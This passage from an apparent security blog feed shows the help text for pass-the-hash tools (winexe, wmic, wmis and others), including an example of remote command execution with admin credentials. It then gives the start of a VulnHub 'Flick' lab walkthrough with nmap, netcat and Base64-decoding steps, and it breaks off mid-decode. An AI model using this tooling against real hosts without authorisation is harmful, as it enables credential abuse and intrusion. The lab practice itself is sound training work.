  -U, &mdash;update                Download only when remote file is newer than</p>

<pre><code>                          local file or local file is missing
</code></pre>

<p>  -R, &mdash;recursive             Recursively download files
  -u, &mdash;username=STRING       Username to use
  -p, &mdash;password=STRING       Password to use
  -w, &mdash;workgroup=STRING      Workgroup to use (optional)
  -n, &mdash;nonprompt             Don&rsquo;t ask anything (non-interactive)
  -d, &mdash;debuglevel=INT        Debuglevel to use
  -o, &mdash;outputfile=STRING     Write downloaded data to specified file
  -O, &mdash;stdout                Write data to stdout
  -D, &mdash;dots                  Show dots as progress indication
  -q, &mdash;quiet                 Be quiet
  -v, &mdash;verbose               Be verbose
  -P, &mdash;keep-permissions      Keep permissions
  -b, &mdash;blocksize=INT         Change number of bytes in a block
  -f, &mdash;rcfile=STRING         Use specified rc file</p>

<p>Help options:
  &ndash;?, &mdash;help                  Show this help message</p>

<pre><code>  --usage                 Display brief usage message
</code></pre>

<p>```</p>

<p><strong>pth-sqsh</strong></p>

<p>``` plain
Use: sqsh [-a count] [-A packet_size] [-b] [-B] [-c [cmdend]] [-C sql]</p>

<pre><code>      [-d severity] [-D database] [-e] [-E editor] [-f severity]
      [-G TDS version] [-h] [-H hostname] [-i filename] [-I interfaces]
      [-J charset] [-k keywords] [-K keytab] [-l level|flags]
      [-L var=value] [-m style] [-n {on|off}] [-N appname] [-o filename]
      [-p] [-P [password]] [-Q query_timeout] [-r [sqshrc]]
      [-R principal] [-s colsep] [-S server] [-t [filter]]
      [-T login_timeout] [-U username] [-v] [-V [bcdimoqru]] [-w width]
      [-X] [-y directory] [-z language] [-Z [secmech]]
</code></pre>

<p> -a  Max. # of errors before abort       -m  Set display mode
 -A  Adjust TDS packet size              -n  Set chained transaction mode
 -b  Suppress banner message on startup  -N  Set Application Name (sqsh)
 -B  Turn off file buffering on startup  -o  Direct all output to file
 -c  Alias for the &lsquo;go&rsquo; command          -p  Display performance stats
 -C  Send sql statement to server        -P  Sybase password (NULL)
 -d  Min. severity level to display      -Q  Query timeout period in seconds
 -D  Change database context on startup  -r  Specify name of .sqshrc
 -e  Echo batch prior to executing       -R  Network security server principal
 -E  Replace default editor (vi)         -s  Alternate column separator (\t)
 -f  Min. severity level for failure     -S  Name of Sybase server ($DSQUERY)
 -G  TDS version to use                  -t  Filter batches through program
 -h  Disable headers and footers         -T  Login timeout period in seconds
 -H  Set the client hostname             -U  Name of Sybase user
 -i  Read input from file                -v  Display current version and exit
 -I  Alternate interfaces file           -V  Request network security services
 -J  Client character set                -w  Adjust result display width
 -k  Specify alternate keywords file     -X  Enable client password encryption
 -K  Network security keytab file (DCE)  -y  Override value of $SYBASE
 -l  Set debugging level                 -z  Alternate display language
 -L  Set the value of a given variable   -Z  Network security mechanism
```</p>

<p><strong>pth-winexe</strong></p>

<p>``` plain
winexe version 1.1
This program may be freely redistributed under the terms of the GNU GPLv3
Usage: winexe [OPTION]&hellip; //HOST COMMAND
Options:
  &ndash;?, &mdash;help                                  Display help message
  -U, &mdash;user=[DOMAIN/]USERNAME[%PASSWORD]     Set the network username
  -A, &mdash;authentication-file=FILE              Get the credentials from a file
  -k, &mdash;kerberos=STRING                       Use Kerberos, -k [yes|no]
  -d, &mdash;debuglevel=DEBUGLEVEL                 Set debug level</p>

<pre><code>  --uninstall                             Uninstall winexe service after remote execution
  --reinstall                             Reinstall winexe service before remote execution
  --system                                Use SYSTEM account
  --profile                               Load user profile
  --convert                               Try to convert characters between local and remote code-pages
  --runas=[DOMAIN\]USERNAME%PASSWORD      Run as user (BEWARE: password is sent in cleartext over net)
  --runas-file=FILE                       Run as user options defined in a file
  --interactive=0|1                       Desktop interaction: 0 - disallow, 1 - allow. If you allow use also --system switch (Win
                                          requirement). Vista do not support this option.
  --ostype=0|1|2                          OS type: 0 - 32-bit, 1 - 64-bit, 2 - winexe will decide. Determines which version (32-bit or 64-bit)
                                          of service will be installed.
</code></pre>

<p>```</p>

<p><strong>pth-wmic</strong></p>

<p>``` plain
Usage: [&ndash;?|&mdash;help] [&mdash;usage] [-d|&mdash;debuglevel DEBUGLEVEL] [&mdash;debug-stderr]</p>

<pre><code>    [-s|--configfile CONFIGFILE] [--option=name=value]
    [-l|--log-basename LOGFILEBASE] [--leak-report] [--leak-report-full]
    [-R|--name-resolve NAME-RESOLVE-ORDER]
    [-O|--socket-options SOCKETOPTIONS] [-n|--netbiosname NETBIOSNAME]
    [-W|--workgroup WORKGROUP] [--realm=REALM] [-i|--scope SCOPE]
    [-m|--maxprotocol MAXPROTOCOL] [-U|--user [DOMAIN\]USERNAME[%PASSWORD]]
    [-N|--no-pass] [--password=STRING] [-A|--authentication-file FILE]
    [-S|--signing on|off|required] [-P|--machine-pass]
    [--simple-bind-dn=STRING] [-k|--kerberos STRING]
    [--use-security-mechanisms=STRING] [-V|--version] [--namespace=STRING]
    [--delimiter=STRING]
    //host query
</code></pre>

<p>Example: wmic -U [domain/]adminuser%password //host &ldquo;select * from Win32_ComputerSystem&rdquo;
```</p>

<p><strong>pth-wmis</strong></p>

<p>``` plain
Usage: [&ndash;?|&mdash;help] [&mdash;usage] [-d|&mdash;debuglevel DEBUGLEVEL] [&mdash;debug-stderr]</p>

<pre><code>    [-s|--configfile CONFIGFILE] [--option=name=value]
    [-l|--log-basename LOGFILEBASE] [--leak-report] [--leak-report-full]
    [-R|--name-resolve NAME-RESOLVE-ORDER]
    [-O|--socket-options SOCKETOPTIONS] [-n|--netbiosname NETBIOSNAME]
    [-W|--workgroup WORKGROUP] [--realm=REALM] [-i|--scope SCOPE]
    [-m|--maxprotocol MAXPROTOCOL] [-U|--user [DOMAIN\]USERNAME[%PASSWORD]]
    [-N|--no-pass] [--password=STRING] [-A|--authentication-file FILE]
    [-S|--signing on|off|required] [-P|--machine-pass]
    [--simple-bind-dn=STRING] [-k|--kerberos STRING]
    [--use-security-mechanisms=STRING] [-V|--version]
    //host
</code></pre>

<p>Example: wmis -U [domain/]adminuser%password //host cmd.exe /c dir c:\ > c:\windows\temp\output.txt
```</p>

<blockquote><p>People are beginning to notice you.  Try dressing before you leave the house.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Flick]]></title>
    <link href="http://chousensha.github.io/blog/2015/02/09/pentest-lab-flick/"/>
    <updated>2015-02-09T08:22:24-05:00</updated>
    <id>http://chousensha.github.io/blog/2015/02/09/pentest-lab-flick</id>
    <content type="html"><![CDATA[<p>The next challenge I&rsquo;m going for from the myriad of options on VulnHub will be Flick, by <a href="https://www.vulnhub.com/author/leonjza,57/">Leonjza</a>!</p>

<blockquote><p>Welcome to the flick boot2root!</p>

<ul>
<li>Where is the flag?</li>
<li>What do you need to flick to find it?</li>
</ul>


<p>Completing &ldquo;flick&rdquo; will require some sound
thinking, good enumeration skills &amp; time! The
objective is to find and read the flag that
lives /root/</p>

<p>As a bonus, can you get root command execution?</p></blockquote>

<!-- more -->


<p>``` plain
nmap -A -p1-65535 192.168.80.129</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-02-09 15:28 EET
Nmap scan report for 192.168.80.129
Host is up (0.00056s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 04:d0:8d:4d:ee:87:30:e7:60:82:63:d3:a8:6e:4b:ac (DSA)
|   2048 64:ec:a9:9b:0b:c0:11:d4:08:63:cf:83:e1:db:23:9a (RSA)
|_  256 2d:32:93:ce:0e:54:3f:84:ee:01:c7:c0:bb:68:e2:02 (ECDSA)
8881/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="http://www.insecure.org/cgi-bin/servicefp-submit.cgi">http://www.insecure.org/cgi-bin/servicefp-submit.cgi</a> :
SF-Port8881-TCP:V=6.47%I=7%D=2/9%Time=54D8B5FC%P=x86_64-unknown-linux-gnu%
SF:r(NULL,5F,&ldquo;Welcome\x20to\x20the\x20admin\x20server.\x20A\x20correct\x2
SF:0password\x20will\x20'flick'\x20the\x20switch\x20and\x20open\x20a\x20ne
SF:w\x20door:\n>\x20&rdquo;)%r(GetRequest,78,&ldquo;Welcome\x20to\x20the\x20admin\x20s
SF:erver.\x20A\x20correct\x20password\x20will\x20'flick'\x20the\x20switch
SF:\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20GET\x20/\x20HTTP/1.0
SF:\r\n\r\n\n>\x20&rdquo;)%r(FourOhFourRequest,9B,&ldquo;Welcome\x20to\x20the\x20admin
SF:\x20server.\x20A\x20correct\x20password\x20will\x20'flick'\x20the\x20s
SF:witch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20GET\x20/nice%20p
SF:orts%2C/Tri%6Eity.txt%2ebak\x20HTTP/1.0\r\n\r\n\n>\x20&rdquo;)%r(GenericLin
SF:es,6A,&ldquo;Welcome\x20to\x20the\x20admin\x20server.\x20A\x20correct\x20pas
SF:sword\x20will\x20'flick'\x20the\x20switch\x20and\x20open\x20a\x20new\x2
SF:0door:\n>\x20OK:\x20\r\n\r\n\n>\x20&rdquo;)%r(HTTPOptions,7C,&ldquo;Welcome\x20to\x
SF:20the\x20admin\x20server.\x20A\x20correct\x20password\x20will\x20'flic
SF:k'\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20OP
SF:TIONS\x20/\x20HTTP/1.0\r\n\r\n\n>\x20&rdquo;)%r(RTSPRequest,7C,&ldquo;Welcome\x20t
SF:o\x20the\x20admin\x20server.\x20A\x20correct\x20password\x20will\x20'f
SF:lick'\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x2
SF:0OPTIONS\x20/\x20RTSP/1.0\r\n\r\n\n>\x20&rdquo;)%r(RPCCheck,92,&ldquo;Welcome\x20t
SF:o\x20the\x20admin\x20server.\x20A\x20correct\x20password\x20will\x20'f
SF:lick'\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x2
SF:0\x80\0\0(r\xfe\x1d\x13\0\0\0\0\0\0\0\x02\0\x01\x86\xa0\0\x01\x97\|\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\n>\x20&rdquo;)%r(DNSVersionBindReq,86,&ldquo;
SF:Welcome\x20to\x20the\x20admin\x20server.\x20A\x20correct\x20password\x
SF:20will\x20'flick'\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\
SF:n>\x20OK:\x20\0\x1e\0\x06\x01\0\0\x01\0\0\0\0\0\0\x07version\x04bind\0\
SF:0\x10\0\x03\n>\x20&rdquo;)%r(DNSStatusRequest,74,&ldquo;Welcome\x20to\x20the\x20adm
SF:in\x20server.\x20A\x20correct\x20password\x20will\x20'flick'\x20the\x2
SF:0switch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20\0\x0c\0\0\x10
SF:\0\0\0\0\0\0\0\0\0\n>\x20&rdquo;);
MAC Address: 00:0C:29:7A:27:7B (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.11 &ndash; 3.14
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```</p>

<p>Not much to work with. I netcat'ed to the 8881 port:</p>

<p>``` plain
nc 192.168.80.129 8881
Welcome to the admin server. A correct password will &lsquo;flick&rsquo; the switch and open a new door:</p>

<blockquote><p>letmein?
OK: letmein?</p>

<p>```</p></blockquote>

<p>I tried bombarding it with long strings to see how it would behave, but nothing happened. Next thing I just thought to try SSH and it would seem this is the more likely route:</p>

<p>``` plain
ssh 192.168.80.129
The authenticity of host &lsquo;192.168.80.129 (192.168.80.129)&rsquo; can&rsquo;t be established.
ECDSA key fingerprint is 2d:32:93:ce:0e:54:3f:84:ee:01:c7:c0:bb:68:e2:02.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;192.168.80.129&rsquo; (ECDSA) to the list of known hosts.</p>

<p>\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
\x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
\x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68
\x4d\x6b\x30\x78\x56\x6d\x70\x4b\x53\x31\x49\x79\x53\x6b\x56\x55\x62\x47\x68\x6f
\x54\x56\x68\x43\x55\x56\x5a\x74\x65\x46\x5a\x6c\x52\x6c\x6c\x35\x56\x47\x74\x73
\x61\x6c\x4a\x74\x61\x47\x39\x55\x56\x6d\x68\x44\x56\x56\x5a\x61\x63\x56\x46\x74
\x52\x6c\x70\x57\x4d\x44\x45\x31\x56\x54\x4a\x30\x56\x31\x5a\x58\x53\x6b\x68\x68
\x52\x7a\x6c\x56\x56\x6d\x78\x61\x4d\x31\x5a\x73\x57\x6d\x46\x6b\x52\x30\x35\x47
\x57\x6b\x5a\x53\x54\x6d\x46\x36\x52\x54\x46\x57\x56\x45\x6f\x77\x56\x6a\x46\x61
\x57\x46\x4e\x72\x61\x47\x68\x53\x65\x6d\x78\x57\x56\x6d\x70\x4f\x54\x30\x30\x78
\x63\x46\x5a\x58\x62\x55\x5a\x72\x55\x6a\x41\x31\x52\x31\x64\x72\x57\x6e\x64\x57
\x4d\x44\x46\x46\x55\x6c\x52\x47\x56\x31\x5a\x46\x62\x33\x64\x57\x61\x6b\x5a\x68
\x56\x30\x5a\x4f\x63\x6d\x46\x48\x61\x46\x4e\x6c\x62\x58\x68\x58\x56\x6d\x30\x78
\x4e\x46\x6c\x56\x4d\x48\x68\x58\x62\x6b\x35\x59\x59\x6c\x56\x61\x63\x6c\x56\x71
\x51\x54\x46\x53\x4d\x57\x52\x79\x56\x32\x78\x4f\x56\x57\x4a\x56\x63\x45\x64\x5a
\x4d\x46\x5a\x33\x56\x6a\x4a\x4b\x56\x56\x4a\x59\x5a\x46\x70\x6c\x61\x33\x42\x49
\x56\x6d\x70\x47\x54\x32\x52\x57\x56\x6e\x52\x68\x52\x6b\x35\x73\x59\x6c\x68\x6f
\x57\x46\x5a\x74\x4d\x58\x64\x55\x4d\x56\x46\x33\x54\x55\x68\x6f\x61\x6c\x4a\x73
\x63\x46\x6c\x5a\x62\x46\x5a\x68\x59\x32\x78\x57\x63\x56\x46\x55\x52\x6c\x4e\x4e
\x56\x6c\x59\x31\x56\x46\x5a\x53\x55\x31\x5a\x72\x4d\x58\x4a\x6a\x52\x6d\x68\x57
\x54\x57\x35\x53\x4d\x31\x5a\x71\x53\x6b\x74\x57\x56\x6b\x70\x5a\x57\x6b\x5a\x77
\x62\x47\x45\x7a\x51\x6b\x6c\x57\x62\x58\x42\x48\x56\x44\x4a\x53\x56\x31\x5a\x75
\x55\x6d\x68\x53\x61\x7a\x56\x7a\x57\x57\x78\x6f\x62\x31\x64\x47\x57\x6e\x52\x4e
\x53\x47\x68\x50\x55\x6d\x31\x34\x56\x31\x52\x56\x61\x47\x39\x58\x52\x30\x70\x79
\x54\x6c\x5a\x73\x57\x6d\x4a\x47\x57\x6d\x68\x5a\x4d\x6e\x68\x58\x59\x7a\x46\x57
\x63\x6c\x70\x47\x61\x47\x6c\x53\x4d\x31\x46\x36\x56\x6a\x4a\x30\x55\x31\x55\x78
\x57\x6e\x4a\x4e\x57\x45\x70\x71\x55\x6d\x31\x6f\x56\x31\x52\x58\x4e\x56\x4e\x4e
\x4d\x56\x70\x78\x55\x32\x74\x30\x56\x31\x5a\x72\x63\x46\x70\x58\x61\x31\x70\x33
\x56\x6a\x46\x4b\x56\x32\x4e\x49\x62\x46\x64\x57\x52\x55\x70\x6f\x56\x6b\x52\x4b
\x54\x32\x52\x47\x53\x6e\x4a\x61\x52\x6d\x68\x70\x56\x6a\x4e\x6f\x56\x56\x64\x57
\x55\x6b\x39\x52\x4d\x57\x52\x48\x56\x32\x35\x53\x54\x6c\x5a\x46\x53\x6c\x68\x55
\x56\x33\x68\x48\x54\x6c\x5a\x61\x57\x45\x35\x56\x4f\x56\x68\x53\x4d\x48\x42\x4a
\x56\x6c\x64\x34\x63\x31\x64\x74\x53\x6b\x68\x68\x52\x6c\x4a\x58\x54\x55\x5a\x77
\x56\x46\x5a\x71\x52\x6e\x64\x53\x4d\x56\x4a\x30\x5a\x55\x64\x73\x55\x32\x4a\x59
\x59\x33\x68\x57\x61\x31\x70\x68\x56\x54\x46\x56\x65\x46\x64\x75\x53\x6b\x35\x58
\x52\x58\x42\x78\x56\x57\x78\x6b\x4e\x47\x46\x47\x56\x58\x64\x68\x52\x55\x35\x55
\x55\x6d\x78\x77\x65\x46\x55\x79\x64\x47\x46\x69\x52\x6c\x70\x7a\x56\x32\x78\x77
\x57\x47\x45\x78\x63\x44\x4e\x5a\x61\x32\x52\x47\x5a\x57\x78\x47\x63\x6d\x4a\x47
\x5a\x46\x64\x4e\x4d\x45\x70\x4a\x56\x6d\x74\x53\x53\x31\x55\x78\x57\x58\x68\x57
\x62\x6c\x5a\x57\x59\x6c\x68\x43\x56\x46\x6c\x72\x56\x6e\x64\x57\x56\x6c\x70\x30
\x5a\x55\x63\x35\x55\x6b\x31\x58\x55\x6e\x70\x57\x4d\x6a\x56\x4c\x56\x30\x64\x4b
\x53\x46\x56\x74\x4f\x56\x56\x57\x62\x48\x42\x59\x56\x47\x78\x61\x59\x56\x64\x48
\x56\x6b\x68\x6b\x52\x32\x68\x70\x55\x6c\x68\x42\x64\x31\x64\x57\x56\x6d\x39\x55
\x4d\x56\x70\x30\x55\x6d\x35\x4b\x54\x31\x5a\x73\x53\x6c\x68\x55\x56\x6c\x70\x33
\x56\x30\x5a\x72\x65\x46\x64\x72\x64\x47\x70\x69\x56\x6b\x70\x49\x56\x6c\x64\x34
\x61\x32\x46\x57\x53\x6e\x52\x50\x56\x45\x35\x58\x54\x57\x35\x6f\x57\x46\x6c\x71
\x53\x6b\x5a\x6c\x52\x6d\x52\x5a\x57\x6b\x55\x31\x56\x31\x5a\x73\x63\x46\x56\x58
\x56\x33\x52\x72\x56\x54\x46\x73\x56\x31\x56\x73\x57\x6c\x68\x69\x56\x56\x70\x7a
\x57\x57\x74\x61\x64\x32\x56\x47\x56\x58\x6c\x6b\x52\x45\x4a\x58\x54\x56\x5a\x77
\x65\x56\x59\x79\x65\x48\x64\x58\x62\x46\x70\x58\x59\x30\x68\x4b\x56\x31\x5a\x46
\x57\x6b\x78\x57\x4d\x56\x70\x48\x59\x32\x31\x4b\x52\x31\x70\x47\x5a\x45\x35\x4e
\x52\x58\x42\x4b\x56\x6d\x31\x30\x55\x31\x4d\x78\x56\x58\x68\x58\x57\x47\x68\x68
\x55\x30\x5a\x61\x56\x6c\x6c\x72\x57\x6b\x74\x6a\x52\x6c\x70\x78\x56\x47\x30\x35
\x56\x31\x5a\x73\x63\x45\x68\x58\x56\x45\x35\x76\x59\x56\x55\x78\x57\x46\x56\x75
\x63\x46\x64\x4e\x56\x32\x68\x32\x56\x31\x5a\x61\x53\x31\x49\x78\x54\x6e\x56\x52
\x62\x46\x5a\x58\x54\x54\x46\x4b\x4e\x6c\x5a\x48\x64\x47\x46\x68\x4d\x6b\x35\x7a
\x56\x32\x35\x53\x61\x31\x4a\x74\x55\x6e\x42\x57\x62\x47\x68\x44\x54\x6c\x5a\x6b
\x56\x56\x46\x74\x52\x6d\x70\x4e\x56\x31\x49\x77\x56\x54\x4a\x30\x61\x31\x64\x48
\x53\x6c\x68\x68\x52\x30\x5a\x56\x56\x6d\x78\x77\x4d\x31\x70\x58\x65\x48\x4a\x6c
\x56\x31\x5a\x49\x5a\x45\x64\x30\x55\x32\x45\x7a\x51\x58\x64\x58\x62\x46\x5a\x68
\x59\x54\x4a\x47\x56\x31\x64\x75\x53\x6d\x6c\x6c\x61\x31\x70\x59\x57\x57\x78\x6f
\x51\x31\x52\x47\x55\x6e\x4a\x58\x62\x45\x70\x73\x55\x6d\x31\x53\x65\x6c\x6c\x56
\x57\x6c\x4e\x68\x56\x6b\x70\x31\x55\x57\x78\x77\x56\x32\x4a\x59\x55\x6c\x68\x61
\x52\x45\x5a\x72\x55\x6a\x4a\x4b\x53\x56\x52\x74\x61\x46\x4e\x57\x56\x46\x5a\x61
\x56\x6c\x63\x78\x4e\x47\x51\x79\x56\x6b\x64\x57\x62\x6c\x4a\x72\x55\x6b\x56\x4b
\x62\x31\x6c\x59\x63\x45\x64\x6c\x56\x6c\x4a\x7a\x56\x6d\x35\x4f\x57\x47\x4a\x47
\x63\x46\x68\x5a\x4d\x47\x68\x4c\x56\x32\x78\x61\x57\x46\x56\x72\x5a\x47\x46\x57
\x56\x31\x4a\x51\x56\x54\x42\x6b\x52\x31\x49\x79\x52\x6b\x68\x69\x52\x6b\x35\x70
\x59\x54\x42\x77\x4d\x6c\x5a\x74\x4d\x54\x42\x56\x4d\x55\x31\x34\x56\x56\x68\x73
\x56\x56\x64\x48\x65\x46\x5a\x5a\x56\x45\x5a\x33\x59\x55\x5a\x57\x63\x56\x4e\x74
\x4f\x56\x64\x53\x62\x45\x70\x5a\x56\x47\x78\x6a\x4e\x57\x45\x79\x53\x6b\x64\x6a
\x52\x57\x68\x58\x59\x6c\x52\x42\x4d\x56\x5a\x58\x63\x33\x68\x58\x52\x6c\x5a\x7a
\x59\x55\x5a\x6b\x54\x6c\x59\x79\x61\x44\x4a\x57\x61\x6b\x4a\x72\x55\x7a\x46\x6b
\x56\x31\x5a\x75\x53\x6c\x42\x57\x62\x48\x42\x76\x57\x56\x52\x47\x64\x31\x4e\x57
\x57\x6b\x68\x6c\x52\x30\x5a\x61\x56\x6d\x31\x53\x52\x31\x52\x73\x57\x6d\x46\x56
\x52\x6c\x6c\x35\x59\x55\x5a\x6f\x57\x6c\x64\x49\x51\x6c\x68\x56\x4d\x46\x70\x68
\x59\x31\x5a\x4f\x63\x56\x56\x73\x57\x6b\x35\x57\x4d\x55\x6c\x33\x56\x6c\x52\x4b
\x4d\x47\x49\x79\x52\x6b\x64\x54\x62\x6b\x35\x55\x59\x6b\x64\x6f\x56\x6c\x5a\x73
\x57\x6e\x64\x4e\x4d\x56\x70\x79\x56\x32\x31\x47\x61\x6c\x5a\x72\x63\x44\x42\x61
\x52\x57\x51\x77\x56\x6a\x4a\x4b\x63\x6c\x4e\x72\x61\x46\x64\x53\x4d\x32\x68\x6f
\x56\x6b\x52\x4b\x52\x31\x59\x78\x54\x6e\x56\x56\x62\x45\x4a\x58\x55\x6c\x52\x57
\x57\x56\x64\x57\x55\x6b\x64\x6b\x4d\x6b\x5a\x48\x56\x32\x78\x57\x55\x32\x45\x78
\x63\x48\x4e\x56\x62\x54\x46\x54\x5a\x57\x78\x73\x56\x6c\x64\x73\x54\x6d\x68\x53
\x56\x45\x5a\x61\x56\x56\x63\x31\x62\x31\x59\x78\x57\x58\x70\x68\x53\x45\x70\x61
\x59\x57\x74\x61\x63\x6c\x56\x71\x52\x6c\x64\x6a\x4d\x6b\x5a\x47\x54\x31\x5a\x6b
\x56\x31\x5a\x47\x57\x6d\x46\x57\x62\x47\x4e\x34\x54\x6b\x64\x52\x65\x56\x5a\x72
\x5a\x46\x64\x69\x62\x45\x70\x79\x56\x57\x74\x57\x53\x32\x49\x78\x62\x46\x6c\x6a
\x52\x57\x52\x73\x56\x6d\x78\x4b\x65\x6c\x5a\x74\x4d\x44\x56\x58\x52\x30\x70\x48
\x59\x30\x5a\x6f\x57\x6b\x31\x48\x61\x45\x78\x57\x4d\x6e\x68\x68\x56\x30\x5a\x57
\x63\x6c\x70\x48\x52\x6c\x64\x4e\x4d\x6d\x68\x4a\x56\x31\x52\x4a\x65\x46\x4d\x78
\x53\x58\x68\x6a\x52\x57\x52\x68\x55\x6d\x73\x31\x57\x46\x59\x77\x56\x6b\x74\x4e
\x62\x46\x70\x30\x59\x30\x56\x6b\x57\x6c\x59\x77\x56\x6a\x52\x57\x62\x47\x68\x76
\x56\x30\x5a\x6b\x53\x47\x46\x47\x57\x6c\x70\x69\x57\x47\x68\x6f\x56\x6d\x31\x34
\x63\x32\x4e\x73\x5a\x48\x4a\x6b\x52\x33\x42\x54\x59\x6b\x5a\x77\x4e\x46\x5a\x58
\x4d\x54\x42\x4e\x52\x6c\x6c\x34\x56\x32\x35\x4f\x61\x6c\x4a\x58\x61\x46\x68\x57
\x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36
\x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77
\x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d</p>

<p> .o88o. oooo   o8o            oooo      <br/>
 888 <code>"</code>888   <code>"'           </code>888      <br/>
o888oo   888  oooo   .ooooo.   888  oooo<br/>
 888     888  <code>888  d88'</code>&ldquo;Y8  888 .8P' <br/>
 888     888   888  888        888888.  <br/>
 888     888   888  888   .o8  888 <code>88b.  
o888o   o888o o888o</code>Y8bod8P' o888o o888o</p>

<p><a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#114;&#111;&#x6f;&#116;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#56;&#48;&#46;&#49;&#50;&#57;">&#x72;&#x6f;&#x6f;&#116;&#x40;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#x38;&#x30;&#x2e;&#49;&#x32;&#57;</a>&rsquo;s password:
```</p>

<p>I copied that block of hex to an online hex to string converter that spit out a Base64 encoded string:</p>

<p><code>plain
Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==
</code></p>

<p>Moving to a Base64 decoder, it appears to be decoded into&hellip;another Base64 string?</p>

<p><code>plain
